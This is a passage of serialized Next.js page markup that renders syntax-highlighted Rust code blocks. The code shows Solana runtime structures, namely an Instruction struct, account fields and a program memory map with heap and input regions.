react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[16]}]\n171:[\"$\",\"span\",\"code-segment-124\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n172:[\"$\",\"span\",\"code-segment-125\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n173:[\"$\",\"span\",\"code-segment-126\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" num_readonly_unsigned_accounts\"]}]\n174:[\"$\",\"span\",\"code-segment-127\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n175:[\"$\",\"span\",\"code-segment-128\",{\"className\":\"$"])</script><script>self.__next_f.push([1,"undefined\",\"style\":{},\"children\":[\" \"]}]\n176:[\"$\",\"span\",\"code-segment-129\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n177:[\"$\",\"span\",\"code-segment-130\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n178:[\"$\",\"span\",\"code-segment-131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n179:[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[17]}]\n17a:[\"$\",\"span\",\"code-segment-133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n17b:[\"$\",\"span\",\"code-segment-134\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n17c:[\"$\",\"span\",\"code-segment-135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n17d:[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[18]}]\n17e:[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[19]}]\n17f:[\"$\",\"span\",\"code-segment-139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n180:[\"$\",\"span\",\"code-segment-140\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n181:[\"$\",\"span\",\"code-segment-141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n182:[\"$\",\"span\",\"code-segment-142\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}]\n183:[\"$\",\"span\",\"code-segment-143\",{\"className\":\"$undefined\",\"s"])</script><script>self.__next_f.push([1,"tyle\":{},\"children\":[\" \"]}]\n184:[\"$\",\"span\",\"code-segment-144\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}]\n185:[\"$\",\"span\",\"code-segment-145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n186:[\"$\",\"span\",\"code-segment-146\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n187:[\"$\",\"span\",\"code-segment-147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n188:[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[20]}]\n189:[\"$\",\"span\",\"code-segment-149\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n18a:[\"$\",\"span\",\"code-segment-150\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n18b:[\"$\",\"span\",\"code-segment-151\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" program_id\"]}]\n18c:[\"$\",\"span\",\"code-segment-152\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n18d:[\"$\",\"span\",\"code-segment-153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n18e:[\"$\",\"span\",\"code-segment-154\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\n18f:[\"$\",\"span\",\"code-segment-155\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n190:[\"$\",\"span\",\"code-segment-156\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"              \"]}]\n191:[\"$\",\"span\",\"code-segment-157\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Program to execute\"]}]\n192:[\"$\",\"span\",\"code-segment-158\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n193:[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRig"])</script><script>self.__next_f.push([1,"ht\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[21]}]\n194:[\"$\",\"span\",\"code-segment-160\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n195:[\"$\",\"span\",\"code-segment-161\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n196:[\"$\",\"span\",\"code-segment-162\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}]\n197:[\"$\",\"span\",\"code-segment-163\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n198:[\"$\",\"span\",\"code-segment-164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n199:[\"$\",\"span\",\"code-segment-165\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}]\n19a:[\"$\",\"span\",\"code-segment-166\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n19b:[\"$\",\"span\",\"code-segment-167\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}]\n19c:[\"$\",\"span\",\"code-segment-168\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n19d:[\"$\",\"span\",\"code-segment-169\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n19e:[\"$\",\"span\",\"code-segment-170\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"      \"]}]\n19f:[\"$\",\"span\",\"code-segment-171\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Accounts this instruction will access\"]}]\n1a0:[\"$\",\"span\",\"code-segment-172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1a1:[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[22]}]\n1a2:[\"$\",\"span\",\"code-segment-174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n1a3:[\"$\",\"span\",\"code-segment-175\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n1a4:[\"$\",\"span\",\"code-segment-176\",{\"className\":\"$undefined\",\"st"])</script><script>self.__next_f.push([1,"yle\":{},\"children\":[\" data\"]}]\n1a5:[\"$\",\"span\",\"code-segment-177\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n1a6:[\"$\",\"span\",\"code-segment-178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1a7:[\"$\",\"span\",\"code-segment-179\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Vec\"]}]\n1a8:[\"$\",\"span\",\"code-segment-180\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n1a9:[\"$\",\"span\",\"code-segment-181\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n1aa:[\"$\",\"span\",\"code-segment-182\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n1ab:[\"$\",\"span\",\"code-segment-183\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n1ac:[\"$\",\"span\",\"code-segment-184\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                   \"]}]\n1ad:[\"$\",\"span\",\"code-segment-185\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Instruction-specific data\"]}]\n1ae:[\"$\",\"span\",\"code-segment-186\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1af:[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[23]}]\n1b0:[\"$\",\"span\",\"code-segment-188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n1b1:[\"$\",\"span\",\"code-segment-189\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n1b2:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n1b3:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x300000000\"]}]\n1b4:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1b5:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}]\n1b6:[\"$\",\"span\",\"code-segm"])</script><script>self.__next_f.push([1,"ent-34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1b7:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"HEAP\"]}]\n1b8:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}]\n1b9:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n1ba:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1bb:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Dynamic\"]}]\n1bc:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1bd:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"memory\"]}]\n1be:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1bf:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n1c0:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"32KB region\"]}]\n1c1:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n1c2:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1c3:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"1.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n1c4:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n1c5:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x400000000\"]}]\n1c6:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1c7:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}]\n1c8:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"$undefined\""])</script><script>self.__next_f.push([1,",\"style\":{},\"children\":[\" \"]}]\n1c9:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"INPUT\"]}]\n1ca:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n1cb:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n1cc:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1cd:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Program\"]}]\n1ce:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" input parameters \"]}]\n1cf:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n1d0:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" serialized account data\"]}]\n1d1:[\"$\",\"span\",\"code-segment-25\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\n1d2:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n1d3:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1d4:[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}]\n1d5:[\"$\",\"span\",\"code-segment-29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n1d6:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n1d7:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" lamports\"]}]\n1d8:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n1d9:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1da:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"token toke"])</script><script>self.__next_f.push([1,"n\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}]\n1db:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n1dc:[\"$\",\"span\",\"code-segment-36\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\n1dd:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n1de:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n1df:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}]\n1e0:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1e1:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n1e2:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1e3:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n1e4:[\"$\",\"span\",\"code-segment-44\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\n1e5:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n1e6:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1e7:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n1e8:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n1e9:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n1ea:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data\"]}]\n1eb:[\"$\",\"span\",\"code-segment-51\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n1ec:[\"$\",\"s"])</script><script>self.__next_f.push([1,"pan\",\"code-segment-52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1ed:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}]\n1ee:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n1ef:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}]\n1f0:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n1f1:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n1f2:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}]\n1f3:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1f4:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n1f5:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n1f6:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}]\n1f7:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}]\n1f8:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}]\n1f9:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}]\n1fa:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n1fb:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}]\n1fc:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Points directly into INPUT region!\"]}]\n1fd:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n1fe:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25e"])</script><script>self.__next_f.push([1,"m\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n1ff:[\"$\",\"span\",\"code-segment-71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n200:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n201:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" owner\"]}]\n202:[\"$\",\"span\",\"code-segment-74\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n203:[\"$\",\"span\",\"code-segment-75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n204:[\"$\",\"span\",\"code-segment-76\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n205:[\"$\",\"span\",\"code-segment-77\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}]\n206:[\"$\",\"span\",\"code-segment-78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n207:[\"$\",\"span\",\"code-segment-79\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}]\n208:[\"$\",\"span\",\"code-segment-80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n209:[\"$\",\"span\",\"code-segment-81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n20a:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n20b:[\"$\",\"span\",\"code-segment-83\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n20c:[\"$\",\"span\",\"code-segment-84\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n20d:[\"$\",\"span\",\"code-segment-85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" rent_epoch\"]}]\n20e:[\"$\",\"span\",\"code-segment-86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n20f:[\"$\",\"span\",\"code-segment-87\","])</script><script>self.__next_f.push([1,"{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n210:[\"$\",\"span\",\"code-segment-88\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Epoch\"]}]\n211:[\"$\",\"span\",\"code-segment-89\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n212:[\"$\",\"span\",\"code-segment-90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n213:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n214:[\"$\",\"span\",\"code-segment-92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n215:[\"$\",\"span\",\"code-segment-93\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n216:[\"$\",\"span\",\"code-segment-94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" is_signer\"]}]\n217:[\"$\",\"span\",\"code-segment-95\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n218:[\"$\",\"span\",\"code-segment-96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n219:[\"$\",\"span\",\"code-segment-97\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\n21a:[\"$\",\"span\",\"code-segment-98\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n21b:[\"$\",\"span\",\"code-segment-99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n21c:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n21d:[\"$\",\"span\",\"code-segment-101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n21e:[\"$\",\"span\",\"code-segment-102\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n21f:[\"$\",\"span\",\"code-segment-103\",{\"className\":\"$u"])</script><script>self.__next_f.push([1,"ndefined\",\"style\":{},\"children\":[\" is_writable\"]}]\n220:[\"$\",\"span\",\"code-segment-104\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n221:[\"$\",\"span\",\"code-segment-105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n222:[\"$\",\"span\",\"code-segment-106\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\n223:[\"$\",\"span\",\"code-segment-107\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n224:[\"$\",\"span\",\"code-segment-108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n225:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[10]}]\n226:[\"$\",\"span\",\"code-segment-110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n227:[\"$\",\"span\",\"code-segment-111\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}]\n228:[\"$\",\"span\",\"code-segment-112\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" 